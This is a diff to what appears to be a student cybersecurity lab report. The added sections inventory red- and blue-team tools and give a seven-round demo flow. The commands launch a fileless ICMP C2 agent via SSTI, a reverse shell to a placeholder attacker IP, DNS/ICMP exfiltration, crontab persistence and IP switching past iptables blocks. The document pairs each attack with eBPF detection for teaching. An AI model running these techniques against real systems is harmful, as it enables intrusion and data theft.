@@ -15,8 +15,11 @@
 2. [Background and Analytical Frameworks](#2-background-and-analytical-frameworks)
 3. [Problems and Attack Descriptions](#3-problems-and-attack-descriptions)
 4. [The Proposed Solutions](#4-the-proposed-solutions)
-5. [Conclusion](#5-conclusion)
-6. [References](#6-references)
+5. [Tool Inventory and Environment](#5-tool-inventory-and-environment)
+6. [Attack Demonstration Flow](#6-attack-demonstration-flow)
+7. [Anticipated Challenges and Risks](#7-anticipated-challenges-and-risks)
+8. [Conclusion](#8-conclusion)
+9. [References](#9-references)
 
 ---
 
@@ -296,9 +299,182 @@ This upgrade illustrates two things: first, real-world malware increasingly uses
 
 ---
 
-## 5. Conclusion
+## 5. Tool Inventory and Environment
 
-This project demonstrates that no single defense layer is enough on its own. Network-layer defenses like honeypots and firewalls get bypassed as soon as the attacker changes their IP. Kernel-layer detection (eBPF v1) works until the attacker switches to a different set of syscalls. It is only by stacking multiple independent detection mechanisms that we get something reasonably robust.
+### 5.1 Dual-Machine Architecture
+
+We use two machines because WSL2 does not have kernel headers, which means eBPF cannot be compiled there. The red team tools do not need eBPF, so they run fine on WSL2.
+
+| Machine | Role | OS | What runs here |
+|---------|------|----|----------------|
+| Lab server | Target + Blue Team | Ubuntu 24.04 (native) | target_app.py, honeypot.py, eBPF MDR, SOC dashboard |
+| Student laptop | Red Team (attacker) | Ubuntu 22.04 (WSL2) | recon, exploit, C2 server, reverse shell listener |
+
+Both machines run `bash setup_env.sh` which auto-detects WSL2 and installs the appropriate packages. A Python venv (`.venv/`) isolates all dependencies.
+
+### 5.2 Red Team Tools
+
+| Tool | File | What it does | Requires sudo |
+|------|------|-------------|---------------|
+| Fileless ICMP C2 | `red_team/red_attacker.py` | Main attack: SSTI → memfd_create → AES-256-CTR ICMP C2 shell | Yes (raw ICMP socket) |
+| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 bypass: fork → connect → dup2 → pty.spawn | No |
+| WAF Bypass Exploit | `red_team/exploit.py` | Backup: Base64 + `${IFS}` space evasion | No |
+| Recon Script | `red_team/recon.sh` | Automated nmap port + service scanning | Depends on scan type |
+| IP Switch | `red_team/ip_switch.sh` | IP alias add/remove to bypass iptables blocks | Yes |
+| Exfil Agent | `red_team/exfil_agent.py` | Deployed on target: collects files, sends via DNS/ICMP | No |
+| Exfil Listener | `red_team/exfil_listener.py` | Runs on attacker: fake DNS server + ICMP receiver | Yes (port 53 + raw ICMP) |
+| Deploy Helper | `red_team/deploy_agent.sh` | Generates base64 one-liner to deploy exfil agent | No |
+| Post-Exploit | `red_team/post_exploit.sh` | System enumeration + crontab persistence | No |
+
+### 5.3 Blue Team Tools
+
+| Tool | File | What it does | Requires sudo |
+|------|------|-------------|---------------|
+| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 syscall hooks: memfd_create, execve, socket | Yes (eBPF) |
+| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hooks: v1 + connect, dup2, dup3 | Yes (eBPF) |
+| Network MDR | `blue_team/blue_mdr_network.py` | Watches trap.log → auto iptables block | Yes (iptables) |
+| SOC Dashboard | `blue_team/soc_dashboard.py` | Real-time web UI on port 8080 | No |
+
+### 5.4 Target Services
+
+| Service | File | Port | Purpose |
+|---------|------|------|---------|
+| Diagnostic API | `target/target_app.py` | 9999 | Flask app with SSTI vulnerability (the actual attack target) |
+| SSH Honeypot | `target/honeypot.py` | 2222 | Fake SSH server that logs IPs to trap.log (deception trap) |
+
+### 5.5 External Dependencies
+
+| Dependency | Used by | Notes |
+|------------|---------|-------|
+| nmap | recon.sh | Port scanning; installed via apt |
+| BCC (python3-bpfcc) | eBPF MDR v1/v2 | eBPF compiler; only on native Linux (not WSL2) |
+| linux-headers | eBPF MDR v1/v2 | Required for eBPF compilation; only on native Linux |
+| OpenSSL libcrypto | red_attacker.py | AES-256-CTR encryption via ctypes; pre-installed on all Linux |
+| Flask | target_app.py, soc_dashboard.py | Web framework; installed in venv |
+| netcat (nc) | manual testing | Used to trigger honeypot; usually pre-installed |
+
+---
+
+## 6. Attack Demonstration Flow
+
+The full demo takes about 20-25 minutes across 7 rounds. Here is the condensed flow with actual commands. (Complete version with expected outputs: `docs/DEMO_FLOW.md`)
+
+### Setup (all terminals)
+
+```bash
+cd ~/cybersecurity && source .venv/bin/activate
+```
+
+### Round 1 — Recon + Honeypot Trap
+
+```bash
+# Lab T1: start target + honeypot
+sudo .venv/bin/python3 target/target_app.py
+sudo .venv/bin/python3 target/honeypot.py
+
+# Lab T2: start network MDR
+sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
+
+# WSL2 T4: scan target
+bash red_team/recon.sh <TARGET_IP>
+# → discovers port 2222 (honeypot) and 9999 (real target)
+
+# WSL2 T4: touch the honeypot → get blocked
+nc -v <TARGET_IP> 2222
+# → MDR auto-blocks attacker IP via iptables
+
+# WSL2 T4: bypass with IP alias
+bash red_team/ip_switch.sh add
+# → new IP is not blocked
+```
+
+### Round 2 — Red Team Attack (Blue OFF)
+
+```bash
+# WSL2 T3: start C2 server
+sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
+
+# WSL2 T4: paste the curl command printed by T3
+curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
+# → agent deploys in-memory, C2 shell obtained
+```
+
+### Round 3-4 — Blue Deploys eBPF v1
+
+```bash
+# Lab T2: start eBPF v1
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr.py --kill
+# → cold-start scan finds and kills existing agent
+# → re-attacks are blocked at memfd_create
+```
+
+### Round 5 — Red Bypasses v1 with Reverse Shell
+
+```bash
+# WSL2 T3: switch to reverse shell attack
+.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+
+# WSL2 T4: paste curl → reverse shell connects
+# → eBPF v1 sees nothing (no memfd, no ICMP, no /proc/fd exec)
+```
+
+### Round 6 — Blue Upgrades to eBPF v2
+
+```bash
+# Lab T2: upgrade to v2
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill
+
+# WSL2 T4: re-attack with reverse shell
+# → v2 detects connect() to port 4444 + dup2 fd hijack → SIGKILL
+```
+
+---
+
+## 7. Anticipated Challenges and Risks
+
+### 7.1 Environment and Compatibility
+
+| Challenge | Description | Our mitigation |
+|-----------|-------------|---------------|
+| WSL2 has no kernel headers | eBPF programs cannot compile on WSL2, because Microsoft's WSL2 kernel ships without linux-headers | Split into dual-machine architecture: red team on WSL2 (no eBPF needed), blue team on native Linux |
+| BCC version mismatches | BCC API changes between Ubuntu 22.04 and 24.04 | Pin to `python3-bpfcc` from apt; test on both versions |
+| OpenSSL library path varies | `ctypes.util.find_library('crypto')` may return different paths across distros | Fallback chain: try `find_library('crypto')`, then `libcrypto.so`, then `libcrypto.so.3` |
+| venv vs system BCC | BCC is a system package but venv isolates from system; `import bcc` may fail | Create venv with `--system-site-packages` so BCC is accessible |
+
+### 7.2 Attack Execution
+
+| Challenge | Description | Our mitigation |
+|-----------|-------------|---------------|
+| ICMP might be blocked | Some lab networks block ICMP at the gateway level | Test with `ping` first; if blocked, the reverse shell attack (TCP) still works |
+| Flask runs as root | The SSTI → memfd_create chain needs the Flask process to have `CAP_NET_RAW` for ICMP raw sockets | In the lab we run Flask with sudo; document that this is a lab simplification |
+| Race condition on trap.log | If honeypot and MDR use different paths for trap.log, MDR won't see new entries | Both scripts resolve trap.log to absolute project-root path automatically |
+| eBPF verifier rejects code | eBPF programs have strict constraints (no unbounded loops, 512-byte stack) | Use bounded loops with fixed iteration counts; keep per-hook logic simple |
+
+### 7.3 Defense Limitations (by design)
+
+These are not bugs -- they are limitations we intentionally leave in place so the demo can show escalation:
+
+| Limitation | Why we keep it | What it demonstrates |
+|------------|---------------|---------------------|
+| Honeypot only blocks known IPs | Attacker can change IP to bypass | Network-layer defense alone is not enough |
+| eBPF v1 only monitors 3 syscalls | Reverse shell uses different syscalls | Defenders must continuously expand coverage |
+| Suspicious port list is static | Reverse shell on port 80/443 would evade port-based detection | But dup2/dup3 behavioral detection still catches it |
+| Shared secret is hardcoded | In production this would be a vulnerability | This is a lab; we focus on the detection side, not key management |
+
+### 7.4 Demo Day Risks
+
+| Risk | Impact | Contingency |
+|------|--------|-------------|
+| Network connectivity between machines | Cannot run cross-machine attacks | Pre-test with `ping` and `curl`; have a single-machine fallback using localhost |
+| eBPF fails to load | Blue team demo is broken | Have a pre-recorded terminal session as backup |
+| Port conflicts (2222, 9999, 8080) | Services fail to bind | Run `cleanup.sh` before each demo to kill leftover processes |
+| Previous demo artifacts interfere | MDR skips old entries; stale iptables rules persist | Always run `sudo bash cleanup.sh` before starting |
+
+---
+
+## 8. Conclusion
+
+This project shows that no single defense layer is enough on its own. Network-layer defenses like honeypots and firewalls get bypassed as soon as the attacker changes their IP. Kernel-layer detection (eBPF v1) works until the attacker switches to a different set of syscalls. It is only by stacking multiple independent detection mechanisms that we get something reasonably robust.
 
 The 7-round structure makes this concrete. When eBPF v1 killed the fileless ICMP C2 agent, the red team pivoted to a standard TCP reverse shell that did not trigger any of the monitored hooks. The blue team had to deploy eBPF v2 with additional hooks for `connect()` and `dup2()` to catch the new technique. This kind of back-and-forth is what real security operations look like, and it is hard to appreciate from reading about it in a textbook.
 
@@ -310,7 +486,7 @@ Overall, the project implements 7 ATT&CK techniques and 7 corresponding detectio
 
 ---
 
-## 6. References
+## 9. References
 
 [1] IBM Security, "Cost of a Data Breach Report 2024," IBM Corporation, 2024. Available: https://www.ibm.com/reports/data-breach
 
